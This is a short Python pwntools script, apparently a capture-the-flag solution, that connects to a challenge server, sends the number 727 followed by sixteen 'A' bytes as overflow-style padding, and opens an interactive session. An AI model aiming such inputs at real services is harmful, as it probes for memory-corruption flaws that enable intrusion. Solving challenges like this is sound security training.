from pwn import *

io = remote('chal.osugaming.lol', 7279)

io.sendline(b'727')
io.sendline(b'A'*16)

io.interactive()